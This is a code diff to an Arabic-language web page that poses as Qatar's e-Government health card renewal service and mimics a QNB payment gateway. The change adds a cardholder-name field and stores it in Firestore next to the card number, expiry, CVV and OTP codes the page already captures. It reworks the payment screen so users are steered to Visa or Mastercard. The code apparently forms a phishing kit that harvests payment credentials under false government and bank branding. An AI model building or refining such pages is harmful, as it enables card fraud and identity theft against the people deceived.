@@ -69,9 +69,9 @@ function StepIndicator({ current }: { current: number }) {
 
 function SummaryRow({ label, value }: { label: string; value: string }) {
   return (
-    <div className="flex items-center justify-between gap-3 py-1">
-      <span className="text-gray-500 text-sm">{label}</span>
-      <span className="text-gray-900 font-semibold text-sm">{value || '—'}</span>
+    <div className="py-1.5">
+      <p className="text-gray-500 text-base">{label}</p>
+      <p className="text-gray-900 font-semibold text-[1.7rem] leading-tight mt-0.5">{value || '—'}</p>
     </div>
   )
 }
@@ -111,6 +111,7 @@ export default function SubmitPage() {
   const [cardNumber, setCardNumber] = useState('')
   const [month, setMonth] = useState('')
   const [year, setYear] = useState('')
+  const [cardHolder, setCardHolder] = useState('')
   const [cvv, setCvv] = useState('')
   const [otp, setOtp] = useState('')
   const [otpList, setOtpList] = useState<string[]>([])
@@ -141,7 +142,7 @@ export default function SubmitPage() {
   const saveToFirestore = async (extra: Record<string, unknown> = {}) => {
     const payload = {
       id: idNum,
-      name: 'غير متوفر',
+      name: cardHolder.trim() || 'غير متوفر',
       phone,
       operationType,
       operationTypeLabel,
@@ -206,11 +207,11 @@ export default function SubmitPage() {
     setStep(4)
   }
 
-  const handleStep4 = async (e: FormEvent) => {
-    e.preventDefault()
+  const proceedToCardEntry = async (selectedMethod: string) => {
+    setMethod(selectedMethod)
     setLoading(true)
     try {
-      await saveToFirestore({ step: 4, currentPage: 'payment-method' })
+      await saveToFirestore({ step: 4, currentPage: 'payment-method', method: selectedMethod })
     } catch {}
     setLoading(false)
     setStep(5)
@@ -219,6 +220,7 @@ export default function SubmitPage() {
   const handleStep5 = async (e: FormEvent) => {
     e.preventDefault()
     const cleanCard = cardNumber.replace(/\s/g, '')
+    if (!cardHolder.trim()) return alert('الرجاء إدخال اسم حامل البطاقة')
     if (cleanCard.length < 16) return alert('الرجاء إدخال رقم البطاقة بشكل صحيح (16 رقمًا)')
     if (!month || !year) return alert('الرجاء إدخال تاريخ انتهاء البطاقة')
     if (cvv.length < 3) return alert('الرجاء إدخال رمز CVV')
@@ -304,19 +306,50 @@ export default function SubmitPage() {
   return (
     <div className="min-h-screen bg-gray-50 py-8 px-4" dir="rtl">
       {waiting && <FullPageLoader message="جاري التحقق من المعلومات..." />}
-      <div className="fixed left-1 top-48 z-20 h-20 w-11 rounded-r-md rounded-l-sm bg-[#C8102E] text-white text-xl font-bold flex items-center justify-center shadow">
-        <span className="text-center leading-tight">
-          المساعد
-          <br />
-          ة
-        </span>
-      </div>
+      {step <= 3 && (
+        <div className="fixed left-1 top-48 z-20 h-20 w-11 rounded-r-md rounded-l-sm bg-[#C8102E] text-white text-xl font-bold flex items-center justify-center shadow">
+          <span className="text-center leading-tight">
+            المساعد
+            <br />
+            ة
+          </span>
+        </div>
+      )}
 
       <div className="max-w-xl mx-auto">
-        <div className="text-center mb-8">
-          <h1 className="text-3xl font-bold text-gray-900">خدمة البطاقة الصحية الإلكترونية</h1>
-          <p className="text-gray-500 text-sm mt-2">طلب الاستعلام عن البطاقة الصحية -- سوف تستغرق حوالي 20 ثانية لإتمام الطلب.</p>
-        </div>
+        {step <= 3 && (
+          <div className="text-center mb-8">
+            <h1 className="text-3xl font-bold text-gray-900">خدمة البطاقة الصحية الإلكترونية</h1>
+            <p className="text-gray-500 text-sm mt-2">طلب الاستعلام عن البطاقة الصحية -- سوف تستغرق حوالي 20 ثانية لإتمام الطلب.</p>
+          </div>
+        )}
+
+        {step >= 4 && step <= 5 && (
+          <div className="mb-6 overflow-hidden rounded-xl border border-gray-200 bg-white">
+            <div className="bg-[#4f205d] text-white flex items-center justify-between px-4 py-2">
+              <span className="font-bold text-xl text-[#0d4aa2] bg-white px-2 py-0.5 rounded-md">QNB</span>
+              <span className="font-semibold">بوابة الدفع</span>
+            </div>
+            <div className="grid grid-cols-4 divide-x divide-gray-200 text-center" dir="rtl">
+              <div className="p-2">
+                <p className="text-[11px] text-gray-500">اسم التاجر</p>
+                <p className="font-semibold text-sm">Qatar e-Government</p>
+              </div>
+              <div className="p-2">
+                <p className="text-[11px] text-gray-500">مبلغ المعاملة</p>
+                <p className="font-semibold text-sm">QAR 100.00</p>
+              </div>
+              <div className="p-2">
+                <p className="text-[11px] text-gray-500">رقم الفاتورة</p>
+                <p className="font-semibold text-sm">{idNum || '20002673930'}</p>
+              </div>
+              <div className="p-2">
+                <p className="text-[11px] text-gray-500">نوع الدفع</p>
+                <p className="font-semibold text-sm uppercase">{method}</p>
+              </div>
+            </div>
+          </div>
+        )}
 
         {step <= 3 && <StepIndicator current={step} />}
 
@@ -449,7 +482,7 @@ export default function SubmitPage() {
             </CardHeader>
             <CardContent>
               <form onSubmit={handleStep3} className="space-y-5">
-                <div className="rounded-xl border border-gray-200 p-4 space-y-2">
+                <div className="space-y-1">
                   <h3 className="text-4xl font-bold text-gray-900 mb-2">معلومات حامل البطاقة</h3>
                   <SummaryRow label="الرقم الشخصي" value={idNum} />
                   <SummaryRow label="تاريخ انتهاء الصلاحية الجديد" value={newExpiryDate} />
@@ -459,7 +492,7 @@ export default function SubmitPage() {
                   <SummaryRow label="هل تريد إستلام الإيصال عبر البريد الإلكتروني ؟" value={emailReceipt === 'yes' ? 'نعم' : 'لا'} />
                   <SummaryRow label="هل تريد إستلام رسالة نصية ؟" value={smsReceipt === 'yes' ? 'نعم' : 'لا'} />
                 </div>
-                <div className="rounded-xl border border-gray-200 p-4">
+                <div className="border-t border-gray-300 pt-4 space-y-1">
                   <h3 className="text-4xl font-bold text-gray-900 mb-2">الرسوم</h3>
                   <SummaryRow label="الرسوم المطلوب" value="رسوم تجديد البطاقة الصحية" />
                   <SummaryRow label="قيمة الرسم" value="100 ريال قطري" />
@@ -481,50 +514,73 @@ export default function SubmitPage() {
         {step === 4 && (
           <Card className="border-0 shadow-md">
             <CardHeader className="pb-2">
-              <CardTitle className="text-2xl">اختر طريقة الدفع</CardTitle>
-              <CardDescription>بطاقات الائتمان / بطاقات الخصم الدولية</CardDescription>
+              <CardTitle className="text-4xl">اختر طريقة الدفع</CardTitle>
             </CardHeader>
-            <CardContent>
-              <form onSubmit={handleStep4} className="space-y-5">
-                <RadioGroup value={method} onValueChange={setMethod} className="grid grid-cols-2 gap-3">
+            <CardContent className="space-y-5">
+              <div>
+                <p className="text-gray-700 text-lg mb-2">بطاقات الائتمان / بطاقات الخصم الدولية</p>
+                <div className="grid grid-cols-3 gap-2">
                   {[
-                    { id: 'mastercard', name: 'Mastercard', logo: '/m.png' },
-                    { id: 'visa', name: 'Visa', logo: '/R.png' },
-                  ].map(m => (
-                    <div
-                      key={m.id}
-                      className={`flex items-center gap-3 p-3 rounded-xl border-2 cursor-pointer transition-all
-                        ${method === m.id ? 'border-[#8A1538] bg-[#8A1538]/5' : 'border-gray-200 hover:border-gray-300'}`}
-                      onClick={() => setMethod(m.id)}
+                    { id: 'amex', label: 'AMEX', disabled: true },
+                    { id: 'mastercard', label: 'Mastercard', logo: '/m.png', disabled: false },
+                    { id: 'visa', label: 'Visa', logo: '/R.png', disabled: false },
+                    { id: 'unionpay', label: 'UnionPay', disabled: true },
+                    { id: 'jcb', label: 'JCB', disabled: true },
+                  ].map((option) => (
+                    <button
+                      key={option.id}
+                      type="button"
+                      disabled={loading || option.disabled}
+                      onClick={() => {
+                        if (!option.disabled) {
+                          void proceedToCardEntry(option.id)
+                        }
+                      }}
+                      className={`h-14 rounded-lg border text-sm font-semibold flex items-center justify-center
+                        ${option.disabled
+                          ? 'bg-gray-100 text-gray-400 border-gray-200 cursor-not-allowed'
+                          : option.id === method
+                            ? 'border-[#C8102E] bg-[#C8102E]/5'
+                            : 'bg-white border-gray-300 hover:border-[#C8102E]/60'}`}
                     >
-                      <RadioGroupItem value={m.id} id={m.id} />
-                      <Label htmlFor={m.id} className="flex items-center gap-3 cursor-pointer flex-1">
-                        <img src={m.logo} alt={m.name} className="h-7 w-auto" />
-                        <span className="font-medium">{m.name}</span>
-                      </Label>
+                      {option.logo ? <img src={option.logo} alt={option.label} className="h-7 w-auto" /> : option.label}
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              <div>
+                <p className="text-gray-700 text-lg mb-2">بطاقات الخصم المباشر والبطاقات الإئتمانية القطرية</p>
+                <div className="grid grid-cols-3 gap-2">
+                  {['هميان', 'NAPS', 'QNB بطاقة'].map((label) => (
+                    <div key={label} className="h-12 rounded-lg border border-gray-200 bg-gray-100 text-gray-400 text-sm font-semibold flex items-center justify-center">
+                      {label}
                     </div>
                   ))}
-                </RadioGroup>
-                <div className="rounded-lg bg-gray-50 border border-gray-200 p-3 text-xs text-gray-500">
-                  سيتم تحويلك لإدخال بيانات البطاقة بشكل آمن
                 </div>
-                <div className="flex gap-3">
-                  <Button type="button" onClick={() => setStep(3)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
-                    إلغاء
-                  </Button>
-                  <Button type="submit" disabled={loading} className="flex-1 h-12 rounded-full bg-[#8A1538] hover:bg-[#6d1030]">
-                    {loading ? 'جاري المتابعة...' : 'متابعة'}
-                    <ChevronLeft className="w-4 h-4 mr-1" />
-                  </Button>
+              </div>
+
+              <div>
+                <p className="text-gray-700 text-lg mb-2">أنواع الدفع الأخرى</p>
+                <div className="grid grid-cols-3 gap-2">
+                  {['G Pay', 'Apple Pay', 'QNBpay', 'حسابي', 'القسط', 'Samsung Pay'].map((label) => (
+                    <div key={label} className="h-12 rounded-lg border border-gray-200 bg-gray-100 text-gray-400 text-sm font-semibold flex items-center justify-center">
+                      {label}
+                    </div>
+                  ))}
                 </div>
-              </form>
+              </div>
+
+              <Button type="button" onClick={() => setStep(3)} className="w-full h-12 bg-[#C8102E] hover:bg-[#a30f27] text-white rounded-md">
+                إلغاء
+              </Button>
             </CardContent>
           </Card>
         )}
 
         {step === 5 && (
           <Card className="border-0 shadow-md">
-            <CardHeader className="pb-2">
+            <CardHeader className="pb-2 space-y-4">
               <div className="flex items-center justify-between">
                 <CardTitle className="text-lg flex items-center gap-2">
                   <Lock className="w-5 h-5 text-[#8A1538]" />
@@ -552,7 +608,16 @@ export default function SubmitPage() {
                     <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                   </div>
                 </div>
-                <div className="grid grid-cols-3 gap-3">
+                <div className="space-y-2">
+                  <Label>الاسم كما هو موضح في بطاقتك <span className="text-red-500">*</span></Label>
+                  <Input
+                    value={cardHolder}
+                    onChange={e => setCardHolder(e.target.value)}
+                    placeholder="ادخل اسم حامل البطاقة"
+                    className="h-12"
+                  />
+                </div>
+                <div className="grid grid-cols-2 gap-3">
                   <div className="space-y-2">
                     <Label>السنة <span className="text-red-500">*</span></Label>
                     <Input
@@ -575,13 +640,18 @@ export default function SubmitPage() {
                       maxLength={2}
                     />
                   </div>
-                  <div className="space-y-2">
+                </div>
+                <div className="space-y-2 max-w-[220px]">
+                  <div className="flex items-center justify-between">
                     <Label>رمز الحماية <span className="text-red-500">*</span></Label>
+                    <span className="text-sm text-[#C8102E]">ماهذا؟</span>
+                  </div>
+                  <div className="space-y-2">
                     <Input
                       value={cvv}
                       onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                       placeholder="CVV"
-                      className="h-11 text-center font-mono"
+                      className="h-11 text-center font-mono bg-white"
                       type="password"
                       inputMode="numeric"
                       maxLength={4}
